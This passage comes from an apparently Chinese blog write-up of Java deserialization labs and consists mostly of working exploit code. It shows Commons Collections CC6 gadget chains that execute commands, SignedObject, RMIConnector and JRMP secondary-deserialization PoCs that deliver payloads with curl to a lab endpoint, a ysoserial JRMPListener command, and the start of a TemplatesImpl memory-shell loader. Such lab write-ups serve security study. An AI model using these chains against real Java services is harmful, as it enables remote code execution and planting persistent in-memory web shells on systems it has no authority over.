class=\"line\"></span><br><span class=\"line\">        Map&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map, <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        TiedMapEntry tiedMapEntry = <span class=\"keyword\">new</span> TiedMapEntry(lazymap,<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        Map&lt;Object,Object&gt; hashmap = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        hashmap.put(tiedMapEntry,<span class=\"string\">&quot;bbb&quot;</span>);</span><br><span class=\"line\">        lazymap.remove(<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        Class c = LazyMap.class;</span><br><span class=\"line\">        Field factory = c.getDeclaredField(<span class=\"string\">&quot;factory&quot;</span>);</span><br><span class=\"line\">        factory.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        factory.set(lazymap,chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> (HashMap) hashmap;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>poc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ByteArrayOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.KeyPair;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.KeyPairGenerator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.Signature;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.security.SignedObject;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">poc</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        KeyPairGenerator kpg = KeyPairGenerator.getInstance(<span class=\"string\">&quot;DSA&quot;</span>);</span><br><span class=\"line\">        kpg.initialize(<span class=\"number\">1024</span>);</span><br><span class=\"line\">        KeyPair kp = kpg.generateKeyPair();</span><br><span class=\"line\">        SignedObject signedObject = <span class=\"keyword\">new</span> SignedObject(exp.CC6(), kp.getPrivate(), Signature.getInstance(<span class=\"string\">&quot;DSA&quot;</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        InvokerTransformer invokerTransformer = <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getObject&quot;</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        HashMap&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>));</span><br><span class=\"line\">        TiedMapEntry tiedMapEntry = <span class=\"keyword\">new</span> TiedMapEntry(lazyMap, signedObject);</span><br><span class=\"line\"></span><br><span class=\"line\">        HashMap&lt;Object, Object&gt; expMap = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        expMap.put(tiedMapEntry, <span class=\"string\">&quot;Poria&quot;</span>);</span><br><span class=\"line\">        lazyMap.remove(signedObject);</span><br><span class=\"line\">        setFieldValue(lazyMap,<span class=\"string\">&quot;factory&quot;</span>, invokerTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        String payload = objectToHexString(expMap);</span><br><span class=\"line\">        Runtime.getRuntime().exec(<span class=\"string\">&quot;curl http://127.0.0.1:8080/basic?data=&quot;</span>+payload);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">bytesTohexString</span><span class=\"params\">(<span class=\"keyword\">byte</span>[] bytes)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (bytes == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            StringBuilder ret = <span class=\"keyword\">new</span> StringBuilder(<span class=\"number\">2</span> * bytes.length);</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; bytes.length; ++i) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> b = <span class=\"number\">15</span> &amp; bytes[i] &gt;&gt; <span class=\"number\">4</span>;</span><br><span class=\"line\">                ret.append(<span class=\"string\">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class=\"line\">                b = <span class=\"number\">15</span> &amp; bytes[i];</span><br><span class=\"line\">                ret.append(<span class=\"string\">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ret.toString();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">objectToHexString</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        ByteArrayOutputStream bos = <span class=\"keyword\">new</span> ByteArrayOutputStream();</span><br><span class=\"line\">        ObjectOutputStream out = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        out = <span class=\"keyword\">new</span> ObjectOutputStream(bos);</span><br><span class=\"line\">        out.writeUTF(<span class=\"string\">&quot;SJTU&quot;</span>);</span><br><span class=\"line\">        out.writeInt(<span class=\"number\">1896</span>);</span><br><span class=\"line\">        out.writeObject(obj);</span><br><span class=\"line\">        out.flush();</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] bytes = bos.toByteArray();</span><br><span class=\"line\">        bos.close();</span><br><span class=\"line\">        String hex = bytesTohexString(bytes);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> hex;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object obj,String fieldname,Object value)</span><span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(obj,value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n\n<h2 id=\"RMIConnector\"><a href=\"#RMIConnector\" class=\"headerlink\" title=\"RMIConnector\"></a>RMIConnector</h2><p>参考：<a href=\"https://tttang.com/archive/1701/#toc_rmiconnector\">二次反序列化 看我一命通关 - 跳跳糖 (tttang.com)</a>，利用链如下</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">HashMap.readObject-&gt;HashMap.hash-&gt;TiedMapEntry.hashcode-&gt;LazyMap.get-&gt;InvokerTransformer.transform-&gt;RMIConnector.connect</span><br></pre></td></tr></table></figure>\n\n<p>exp，打cc6</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ByteArrayOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">exp</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">CC6</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        Transformer[] transformers = <span class=\"keyword\">new</span> Transformer[]&#123;</span><br><span class=\"line\">                <span class=\"keyword\">new</span> ConstantTransformer(Runtime.class),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;getMethod&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class, Class[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;getRuntime&quot;</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;invoke&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;Object.class, Object[].class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>&#125;),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;exec&quot;</span>, <span class=\"keyword\">new</span> Class[]&#123;String.class&#125;, <span class=\"keyword\">new</span> Object[]&#123;<span class=\"string\">&quot;calc&quot;</span>&#125;)</span><br><span class=\"line\">        &#125;;</span><br><span class=\"line\">        ChainedTransformer chainedTransformer = <span class=\"keyword\">new</span> ChainedTransformer(transformers);</span><br><span class=\"line\"></span><br><span class=\"line\">        Map&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        Map&lt;Object,Object&gt; lazymap = LazyMap.decorate(map, <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>));</span><br><span class=\"line\"></span><br><span class=\"line\">        TiedMapEntry tiedMapEntry = <span class=\"keyword\">new</span> TiedMapEntry(lazymap,<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        Map&lt;Object,Object&gt; hashmap = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        hashmap.put(tiedMapEntry,<span class=\"string\">&quot;bbb&quot;</span>);</span><br><span class=\"line\">        lazymap.remove(<span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\"></span><br><span class=\"line\">        Class c = LazyMap.class;</span><br><span class=\"line\">        Field factory = c.getDeclaredField(<span class=\"string\">&quot;factory&quot;</span>);</span><br><span class=\"line\">        factory.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        factory.set(lazymap,chainedTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"keyword\">return</span> serialize(hashmap);</span><br><span class=\"line\">        </span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">serialize</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        ByteArrayOutputStream baos = <span class=\"keyword\">new</span> ByteArrayOutputStream();</span><br><span class=\"line\">        ObjectOutputStream oos = <span class=\"keyword\">new</span> ObjectOutputStream(baos);</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">        oos.close();</span><br><span class=\"line\">        String base64 = <span class=\"keyword\">new</span> String(Base64.getEncoder().encode(baos.toByteArray()));</span><br><span class=\"line\">        System.out.println(base64);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> base64;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>poc，利用 RMIConnector</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.Transformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ChainedTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.management.remote.JMXServiceURL;</span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.management.remote.rmi.RMIConnector;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ByteArrayOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">poc</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\"></span><br><span class=\"line\">        JMXServiceURL jmxServiceURL = <span class=\"keyword\">new</span> JMXServiceURL(<span class=\"string\">&quot;service:jmx:rmi://&quot;</span>);</span><br><span class=\"line\">        setFieldValue(jmxServiceURL, <span class=\"string\">&quot;urlPath&quot;</span>, <span class=\"string\">&quot;/stub/&quot;</span>+exp.CC6());</span><br><span class=\"line\">        RMIConnector rmiConnector = <span class=\"keyword\">new</span> RMIConnector(jmxServiceURL, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        </span><br><span class=\"line\">        InvokerTransformer invokerTransformer = <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;connect&quot;</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        HashMap&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>));</span><br><span class=\"line\">        TiedMapEntry tiedMapEntry = <span class=\"keyword\">new</span> TiedMapEntry(lazyMap, rmiConnector);</span><br><span class=\"line\"></span><br><span class=\"line\">        HashMap&lt;Object, Object&gt; expMap = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        expMap.put(tiedMapEntry, <span class=\"string\">&quot;Poria&quot;</span>);</span><br><span class=\"line\">        lazyMap.remove(rmiConnector);</span><br><span class=\"line\">        setFieldValue(lazyMap,<span class=\"string\">&quot;factory&quot;</span>, invokerTransformer);</span><br><span class=\"line\"></span><br><span class=\"line\">        String payload = objectToHexString(expMap);</span><br><span class=\"line\">        Runtime.getRuntime().exec(<span class=\"string\">&quot;curl http://127.0.0.1:8080/basic?data=&quot;</span>+payload);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">bytesTohexString</span><span class=\"params\">(<span class=\"keyword\">byte</span>[] bytes)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (bytes == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            StringBuilder ret = <span class=\"keyword\">new</span> StringBuilder(<span class=\"number\">2</span> * bytes.length);</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; bytes.length; ++i) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> b = <span class=\"number\">15</span> &amp; bytes[i] &gt;&gt; <span class=\"number\">4</span>;</span><br><span class=\"line\">                ret.append(<span class=\"string\">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class=\"line\">                b = <span class=\"number\">15</span> &amp; bytes[i];</span><br><span class=\"line\">                ret.append(<span class=\"string\">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ret.toString();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">objectToHexString</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        ByteArrayOutputStream bos = <span class=\"keyword\">new</span> ByteArrayOutputStream();</span><br><span class=\"line\">        ObjectOutputStream out = <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        out = <span class=\"keyword\">new</span> ObjectOutputStream(bos);</span><br><span class=\"line\">        out.writeUTF(<span class=\"string\">&quot;SJTU&quot;</span>);</span><br><span class=\"line\">        out.writeInt(<span class=\"number\">1896</span>);</span><br><span class=\"line\">        out.writeObject(obj);</span><br><span class=\"line\">        out.flush();</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] bytes = bos.toByteArray();</span><br><span class=\"line\">        bos.close();</span><br><span class=\"line\">        String hex = bytesTohexString(bytes);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> hex;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">setFieldValue</span><span class=\"params\">(Object obj,String fieldname,Object value)</span><span class=\"keyword\">throws</span> Exception</span>&#123;</span><br><span class=\"line\">        Field field = obj.getClass().getDeclaredField(fieldname);</span><br><span class=\"line\">        field.setAccessible(<span class=\"keyword\">true</span>);</span><br><span class=\"line\">        field.set(obj,value);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h2 id=\"JRMP\"><a href=\"#JRMP\" class=\"headerlink\" title=\"JRMP\"></a>JRMP</h2><p>除了二次反序列化，还有利用JRMP协议，具体就是RMI反序列化那篇文章的内容，这里记录一下打法</p>\n<p>ysoserial 开启一个 JRMPListener</p>\n<figure class=\"highlight plain\"><table><tr><td class=\"code\"><pre><span class=\"line\">java -cp ysoserial.jar ysoserial.exploit.JRMPListener 9999 CommonsCollections6 &quot;calc&quot;</span><br></pre></td></tr></table></figure>\n\n<p>poc</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> sun.rmi.server.UnicastRef;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ByteArrayOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Proxy;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.registry.Registry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.rmi.server.RemoteObjectInvocationHandler;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">poc</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"comment\">//获取UnicastRef对象</span></span><br><span class=\"line\">        String jrmpListenerHost = <span class=\"string\">&quot;127.0.0.1&quot;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">int</span> jrmpListenerPort = <span class=\"number\">9999</span>;</span><br><span class=\"line\">        UnicastRef ref = generateUnicastRef(jrmpListenerHost, jrmpListenerPort);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//通过构造函数封装进入RemoteObjectInvocationHandler</span></span><br><span class=\"line\">        RemoteObjectInvocationHandler obj = <span class=\"keyword\">new</span> RemoteObjectInvocationHandler(ref);</span><br><span class=\"line\"></span><br><span class=\"line\">        <span class=\"comment\">//使用动态代理改变obj的类型变为Registry，这是Remote类型的子类</span></span><br><span class=\"line\">        <span class=\"comment\">//所以接下来bind可以填入proxy</span></span><br><span class=\"line\">        Registry proxy = (Registry) Proxy.newProxyInstance(poc.class.getClassLoader(),</span><br><span class=\"line\">                <span class=\"keyword\">new</span> Class[]&#123;Registry.class&#125;, obj);</span><br><span class=\"line\"></span><br><span class=\"line\">        ByteArrayOutputStream ser = <span class=\"keyword\">new</span> ByteArrayOutputStream();</span><br><span class=\"line\">        ObjectOutputStream oser = <span class=\"keyword\">new</span> ObjectOutputStream(ser);</span><br><span class=\"line\">        oser.writeUTF(<span class=\"string\">&quot;SJTU&quot;</span>);</span><br><span class=\"line\">        oser.writeInt(<span class=\"number\">1896</span>);</span><br><span class=\"line\">        oser.writeObject(proxy);</span><br><span class=\"line\">        oser.close();</span><br><span class=\"line\"></span><br><span class=\"line\">        String payload = bytesTohexString(ser.toByteArray());</span><br><span class=\"line\">        Runtime.getRuntime().exec(<span class=\"string\">&quot;curl http://127.0.0.1:8080/basic?data=&quot;</span>+payload);</span><br><span class=\"line\"></span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> UnicastRef <span class=\"title\">generateUnicastRef</span><span class=\"params\">(String host, <span class=\"keyword\">int</span> port)</span> </span>&#123;</span><br><span class=\"line\">        java.rmi.server.ObjID objId = <span class=\"keyword\">new</span> java.rmi.server.ObjID();</span><br><span class=\"line\">        sun.rmi.transport.tcp.TCPEndpoint endpoint = <span class=\"keyword\">new</span> sun.rmi.transport.tcp.TCPEndpoint(host, port);</span><br><span class=\"line\">        sun.rmi.transport.LiveRef liveRef = <span class=\"keyword\">new</span> sun.rmi.transport.LiveRef(objId, endpoint, <span class=\"keyword\">false</span>);</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"keyword\">new</span> sun.rmi.server.UnicastRef(liveRef);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String <span class=\"title\">bytesTohexString</span><span class=\"params\">(<span class=\"keyword\">byte</span>[] bytes)</span> </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (bytes == <span class=\"keyword\">null</span>) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"keyword\">null</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            StringBuilder ret = <span class=\"keyword\">new</span> StringBuilder(<span class=\"number\">2</span> * bytes.length);</span><br><span class=\"line\">            <span class=\"keyword\">for</span>(<span class=\"keyword\">int</span> i = <span class=\"number\">0</span>; i &lt; bytes.length; ++i) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">int</span> b = <span class=\"number\">15</span> &amp; bytes[i] &gt;&gt; <span class=\"number\">4</span>;</span><br><span class=\"line\">                ret.append(<span class=\"string\">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class=\"line\">                b = <span class=\"number\">15</span> &amp; bytes[i];</span><br><span class=\"line\">                ret.append(<span class=\"string\">&quot;0123456789abcdef&quot;</span>.charAt(b));</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> ret.toString();</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>本地没能命令执行。</p>\n<p><img src=\"https://picgo-1305609125.cos.ap-nanjing.myqcloud.com/java-serlab/image-20221114230909887.png\" alt=\"image-20221114230909887\"></p>\n<h1 id=\"Lab4\"><a href=\"#Lab4\" class=\"headerlink\" title=\"Lab4\"></a>Lab4</h1><p>不出网，其他同Lab3，记录一下内存马.</p>\n<p>exp</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.ConstantTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.functors.InvokerTransformer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.apache.commons.collections.map.LazyMap;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.lang.reflect.Field;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.HashMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Map;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"class\"><span class=\"keyword\">class</span> <span class=\"title\">exp</span> </span>&#123;</span><br><span class=\"line\">    <span class=\"function\"><span class=\"keyword\">public</span> <span class=\"keyword\">static</span> HashMap <span class=\"title\">shell</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception </span>&#123;</span><br><span class=\"line\">        <span class=\"keyword\">byte</span>[] code = Base64.getDecoder().decode(<span class=\"string\">&quot;yv66vgAAADQA7QoAOQC...&quot;</span>);  <span class=\"comment\">//内存马的base64</span></span><br><span class=\"line\">        TemplatesImpl templates = <span class=\"keyword\">new</span> TemplatesImpl();</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_bytecodes&quot;</span>, <span class=\"keyword\">new</span> <span class=\"keyword\">byte</span>[][]&#123;code&#125;);</span><br><span class=\"line\">        setFieldValue(templates, <span class=\"string\">&quot;_name&quot;</span>, <span class=\"string\">&quot;aaa&quot;</span>);</span><br><span class=\"line\">        setFieldValue(templates,<span class=\"string\">&quot;_tfactory&quot;</span>, <span class=\"keyword\">new</span> TransformerFactoryImpl());</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">        InvokerTransformer invokerTransformer = <span class=\"keyword\">new</span> InvokerTransformer(<span class=\"string\">&quot;newTransformer&quot;</span>, <span class=\"keyword\">null</span>, <span class=\"keyword\">null</span>);</span><br><span class=\"line\">        HashMap&lt;Object, Object&gt; map = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        Map&lt;Object,Object&gt; lazyMap = LazyMap.decorate(map, <span class=\"keyword\">new</span> ConstantTransformer(<span class=\"number\">1</span>));</span><br><span class=\"line\">        TiedMapEntry tiedMapEntry = <span class=\"keyword\">new</span> TiedMapEntry(lazyMap, templates);</span><br><span class=\"line\"></span><br><span class=\"line\">        HashMap&lt;Object, Object&gt; expMap = <span class=\"keyword\">new</span> HashMap&lt;&gt;();</span><br><span class=\"line\">        expMap.put(tiedMapEntry, <span class=\"string\">&quot;Poria&quot;</span>);</span><br><span class=\"line\">        lazyMap.remove(templates);</span><br><span class=\"line\">        